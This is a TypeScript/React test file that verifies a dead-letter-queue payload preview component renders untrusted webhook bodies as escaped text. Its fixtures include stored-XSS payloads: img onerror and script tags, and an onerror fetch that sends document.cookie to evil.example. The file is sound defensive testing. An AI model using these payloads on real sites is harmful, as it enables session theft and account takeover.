/**
 * [RELAY-16] Payload preview must never render as HTML.
 *
 * ─── What this file proves, and what it doesn't ───────────────────────────────────────
 *
 * `DlqPayloadPreview` (components/relay/DlqPayloadPreview.tsx) is the only place a
 * DLQ item's stored body reaches the DOM — `DeliveryDetail` never renders a body at all
 * (`DeliveryLog` has no body column, see the note at the top of DeliveryDetail.tsx), and
 * `DlqTable` only passes `payloadPreview` straight through to this component unmodified.
 * So this component is the whole attack surface for RELAY-16's stored-XSS scenario: an
 * attacker who controls a webhook body chooses `preview`, and if that string were ever
 * parsed as HTML instead of rendered as a text node, it would execute inside an
 * authenticated operator's dashboard session the moment they expanded the DLQ row.
 *
 * Read of the source (not assumed): `preview` is interpolated as `{preview}`, a plain
 * text child of `<code>` — no `dangerouslySetInnerHTML` anywhere in the file or in
 * anything upstream of it (`DlqTable.tsx`, `DlqQueue.tsx`). React escapes text-node
 * children by construction, so this was already safe. This test exists to make that a
 * property CI checks rather than a claim in a comment — it fails the moment anyone
 * routes `preview` through an unescaped sink, e.g. an HTML-based syntax highlighter that
 * doesn't escape its input first.
 *
 * Real DOM, not snapshot: renders with `react-dom/client` into a live jsdom container and
 * asserts on the actual node tree, so a `<script>` or `<img onerror>` sneaking in would
 * show up as a real element, not just a string difference in a serialized snapshot.
 */

import { act } from 'react';
import { createRoot, type Root } from 'react-dom/client';

import { DlqPayloadPreview } from 'components/relay/DlqPayloadPreview';

// No @testing-library/react in this repo's dashboard deps, so this file drives
// react-dom/client directly. React 18's `act` only suppresses its "not wrapped in
// act()" warning when this flag is set — testing-library normally sets it for you.
(global as unknown as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT =
  true;

/** A body an attacker fully controls — both classic injection shapes in one string. */
const MALICIOUS_PAYLOAD =
  '<img src=x onerror=alert(1)><script>alert(document.cookie)</script>';

describe('[RELAY-16] DlqPayloadPreview renders payload bodies as text, never HTML', () => {
  let container: HTMLDivElement;
  let root: Root;

  beforeEach(() => {
    container = document.createElement('div');
    document.body.appendChild(container);
    root = createRoot(container);
  });

  afterEach(() => {
    act(() => {
      root.unmount();
    });
    container.remove();
  });

  it('does not create an executable <script> or <img onerror> element from the payload', () => {
    act(() => {
      root.render(
        <DlqPayloadPreview
          preview={MALICIOUS_PAYLOAD}
          payloadBytes={MALICIOUS_PAYLOAD.length}
          truncated={false}
          failReason="Destination returned 500 after 3 attempts"
        />
      );
    });

    // The real assertion: no executable nodes anywhere in the rendered subtree.
    expect(container.querySelectorAll('script').length).toBe(0);
    expect(container.querySelectorAll('img').length).toBe(0);

    // And the payload string is present verbatim as a TEXT node inside <code> — proving
    // it was rendered, not silently dropped (a component that renders nothing would also
    // pass the two assertions above for the wrong reason).
    const code = container.querySelector('code');
    expect(code).not.toBeNull();
    expect(code!.textContent).toBe(MALICIOUS_PAYLOAD);

    // The DOM's serialized markup must carry the escaped entity form, not the raw
    // brackets, confirming React went through its text-escaping path.
    expect(code!.innerHTML).toContain('&lt;script&gt;');
    expect(code!.innerHTML).toContain('&lt;img');
    expect(code!.innerHTML).not.toContain('<script>');
  });

  it('handles an onerror-only image tag payload the same way', () => {
    const onErrorOnly = '<img src="x" onerror="fetch(`//evil.example/${document.cookie}`)">';

    act(() => {
      root.render(
        <DlqPayloadPreview
          preview={onErrorOnly}
          payloadBytes={onErrorOnly.length}
          truncated={false}
          failReason="Timed out after 10000ms"
        />
      );
    });

    expect(container.querySelectorAll('img').length).toBe(0);
    expect(container.querySelector('code')!.textContent).toBe(onErrorOnly);
  });

  it('renders the "no payload stored" state as text too, for a null preview', () => {
    act(() => {
      root.render(
        <DlqPayloadPreview
          preview={null}
          payloadBytes={null}
          truncated={false}
          failReason="<img src=x onerror=alert(1)> Destination unreachable"
        />
      );
    });

    // failReason is Relay's own composed string (lib/relay/forward.ts), never a
    // destination response body — but it is still rendered as escaped text here, and
    // this locks that in rather than assuming it from the source alone.
    expect(container.querySelectorAll('img').length).toBe(0);
    expect(container.querySelectorAll('script').length).toBe(0);
    expect(container.textContent).toContain(
      '<img src=x onerror=alert(1)> Destination unreachable'
    );
  });
});
